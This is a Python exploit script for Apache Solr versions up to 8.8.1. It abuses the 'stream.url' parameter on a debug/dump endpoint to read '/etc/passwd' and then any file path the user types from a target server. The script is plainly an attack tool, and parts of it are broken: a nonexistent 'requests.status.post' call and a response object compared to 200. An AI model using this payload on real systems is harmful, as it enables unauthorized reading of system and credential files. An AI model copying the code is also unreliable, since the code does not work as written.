#! /usr/bin/python3
#Apache Solr <= 8.8.1
#Author Drunkmars


import requests
import os
import sys
import re
from urllib3.exceptions import InsecureRequestWarning

def Check():
	try:
		CheckData = "stream.url=file:///etc/passwd"
		response = requests.status.post(url = payload,data = CheckData,headers = headers,verify = False,timeout = 10)
		
		if(response == 200):
			print("[+] Target can vulnable!")
			return True
		else:
			print("[-] Target can not vulnable!")

	except Exception as e:
		print("[-] Server error!")

def Exploit():
	try:
		command = input("# ")
		ExpData = "stream.url=file://" + command
		response = requests.status.post(url = payload,data = ExpData,headers = headers,verify = False,timeout = 10)
		print(response.text)
		
	except Exception as e:
		print("[-] Server not support this command!")

if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("UseAge: python3 exploit.py target")
		print("Example: python3 exploit.py https://192.168.1.2/")
		sys.exit()

headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
      	}


target = sys.argv[1]
payload = target + 'solr/demo/./debug/dump?param=ContentStreams'
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

while Check() is True:
	Exploit()